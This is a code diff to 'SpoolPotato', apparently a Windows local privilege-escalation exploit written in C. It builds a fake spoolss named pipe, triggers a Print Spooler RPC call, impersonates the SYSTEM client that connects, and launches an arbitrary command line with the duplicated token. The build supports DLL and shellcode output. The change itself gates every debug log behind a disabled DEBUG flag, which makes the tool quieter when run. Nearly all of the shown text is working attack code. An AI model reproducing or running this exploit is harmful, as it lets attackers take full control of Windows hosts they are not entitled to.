@@ -16,7 +16,7 @@
 // Global settings
 ////////
 
-#define DEBUG
+//#define DEBUG
 //#define EXE_BUILD
 #define DLL_BUILD
 #define SHELLCODE_BUILD
@@ -96,13 +96,17 @@ BOOL EnablePrivilege(const wchar_t *PrivilegeName) {
             HeapFree(GetProcessHeap(), 0, pTokenPrivileges);
         }
         else {
+#ifdef DEBUG
             DebugLog(L"... failed to query required token information length from primary process token.");
+#endif
         }
 
         CloseHandle(hToken);
     }
     else {
+#ifdef DEBUG
         DebugLog(L"... failed to open handle to primary token of the current process with query/modify permissions.");
+#endif
     }
 
     return bResult;
@@ -125,8 +129,9 @@ BOOL CreateFakeSpoolPipe(HANDLE *phPipe, HANDLE *phEvent, wchar_t **ppSpoolPipeU
             SECURITY_ATTRIBUTES Sa = { 0 };
 
             _snwprintf_s(FakePipeName, MAX_PATH, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\spoolss", *ppSpoolPipeUuidStr);
+#ifdef DEBUG
             DebugLog(L"... generated fake spool pipe name of %ws", FakePipeName);
-
+#endif
             if (InitializeSecurityDescriptor(&Sd, SECURITY_DESCRIPTOR_REVISION)) {
                 if (ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&Sa)->lpSecurityDescriptor), NULL)) {
                     if ((*phPipe = CreateNamedPipeW(FakePipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &Sa)) != NULL) { // FILE_FLAG_OVERLAPPED allows for the creation of an async pipe
@@ -137,15 +142,21 @@ BOOL CreateFakeSpoolPipe(HANDLE *phPipe, HANDLE *phEvent, wchar_t **ppSpoolPipeU
 
                         if (!ConnectNamedPipe(*phPipe, &Overlapped)) {
                             if (GetLastError() == ERROR_IO_PENDING) {
+#ifdef DEBUG
                                 DebugLog(L"... named pipe connection successful");
+#endif
                                 return TRUE;
                             }
                             else {
+#ifdef DEBUG
                                 DebugLog(L"... named pipe connection failed with invalid error code");
+#endif
                             }
                         }
                         else {
+#ifdef DEBUG
                             DebugLog(L"... named pipe connection succeeded while it should have failed with ERROR_IO_PENDING");
+#endif
                         }
                     }
                 }
@@ -197,8 +208,9 @@ BOOL LaunchImpersonatedProcess(HANDLE hPipe, const wchar_t *CommandLine, uint32_
     // Impersonate the specified pipe, duplicate and then customize its token to fit the appropriate session ID and desktop, and launch a process in its context.
 
     if (ImpersonateNamedPipeClient(hPipe)) {
+#ifdef DEBUG
         DebugLog(L"... named pipe impersonation successful");
-
+#endif
         if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken)) {
             if (DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup)) {
                 wchar_t CurrentDirectory[MAX_PATH + 1] = { 0 };
@@ -210,7 +222,9 @@ BOOL LaunchImpersonatedProcess(HANDLE hPipe, const wchar_t *CommandLine, uint32_
 
                 if (dwSessionId) {
                     if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &dwSessionId, sizeof(uint32_t))) {
+#ifdef DEBUG
                         DebugLog(L"... non-zero session ID specified but token session ID modification failed");
+#endif
                         return FALSE;
                     }
                 }
@@ -227,30 +241,42 @@ BOOL LaunchImpersonatedProcess(HANDLE hPipe, const wchar_t *CommandLine, uint32_
 
                         if (!CreateProcessAsUserW(hSystemTokenDup, NULL, CommandLineBuf, NULL, NULL, bInteractive, dwCreationFlags, pEnvironment, CurrentDirectory, &StartupInfo, &ProcInfo)) {
                             if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD) {
+#ifdef DEBUG
                                 DebugLog(L"... CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW()...");
+#endif
                                 RevertToSelf();
 
                                 if (!bInteractive) {
                                     wcscpy_s(CommandLineBuf, 500, CommandLine);
 
                                     if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, CommandLineBuf, dwCreationFlags, pEnvironment, CurrentDirectory, &StartupInfo, &ProcInfo)) {
+#ifdef DEBUG
                                         DebugLog(L"... CreateProcessWithTokenW() failed. Error: %d", GetLastError());
+#endif
                                     }
                                     else {
+#ifdef DEBUG
                                         DebugLog(L"... CreateProcessWithTokenW() successfully executed %ws", CommandLine);
+#endif
                                         bResult = TRUE;
                                     }
                                 }
                                 else {
+#ifdef DEBUG
                                     DebugLog(L"... CreateProcessWithTokenW() isn't compatible with non-zero session ID");
+#endif
                                 }
                             }
                             else {
+#ifdef DEBUG
                                 DebugLog(L"... CreateProcessAsUser() failed. Error: %d", GetLastError());
+#endif
                             }
                         }
                         else {
+#ifdef DEBUG
                             DebugLog(L"... CreateProcessAsUser() successfully executed command line %ws", CommandLine);
+#endif
                             bResult = TRUE;
                         }
 
@@ -275,7 +301,9 @@ BOOL LaunchImpersonatedProcess(HANDLE hPipe, const wchar_t *CommandLine, uint32_
         }
     }
     else {
+#ifdef DEBUG
         DebugLog(L"... named pipe impersonation failed");
+#endif
     }
 
     return bResult;
@@ -288,20 +316,24 @@ BOOL SpoolPotato() {
         HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
         HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
         uint32_t dwWaitError = 0;
-
+#ifdef DEBUG
         DebugLog(L"... successfully obtained %ws privilege", SE_IMPERSONATE_NAME);
-
+#endif
         if (CreateFakeSpoolPipe(&hSpoolPipe, &hSpoolPipeEvent, &pSpoolPipeUuidStr)) {
+#ifdef DEBUG
             DebugLog(L"... named pipe creation and connection successful. Listening...");
+#endif
             CreateThread(NULL, 0, TriggerPrintSpoolerRpc, pSpoolPipeUuidStr, 0, NULL);
             dwWaitError = WaitForSingleObject(hSpoolPipeEvent, 5000);
 
             if (dwWaitError == WAIT_OBJECT_0) {
+#ifdef DEBUG
                 DebugLog(L"... recieved connection over named pipe");
-
+#endif
                 if (LaunchImpersonatedProcess(hSpoolPipe, COMMAND_LINE, SESSION_ID, INTERACTIVE_PROCESS)) {
+#ifdef DEBUG
                     DebugLog(L"... successfully launched process while impersonating RPC client. Syncing event file with WPAD client...");
-
+#endif
                     /*
                     SpoolPotato/WPAD client synchronization
 
@@ -330,26 +362,35 @@ BOOL SpoolPotato() {
                     while (!DeleteFileW(SYNC_FILE)) {
                         Sleep(500);
                     }
-
+#ifdef DEBUG
                     DebugLog(L"... successfully synced WPAD client event file and deleted it");
+#endif
                 }
                 else {
+#ifdef DEBUG
                     DebugLog(L"... failed to launch process while impersonating RPC client");
+#endif
                 }
             }
             else {
+#ifdef DEBUG
                 DebugLog(L"... named pipe listener failed with wait error %d", dwWaitError);
+#endif
             }
 
             CloseHandle(hSpoolPipe);
             CloseHandle(hSpoolPipeEvent);
         }
         else {
+#ifdef DEBUG
             DebugLog(L"... named pipe creation and connection failed");
+#endif
         }
     }
     else {
+#ifdef DEBUG
         DebugLog(L"... failed to obtain %ws privilege", SE_IMPERSONATE_NAME);
+#endif
     }
 
     return 0;
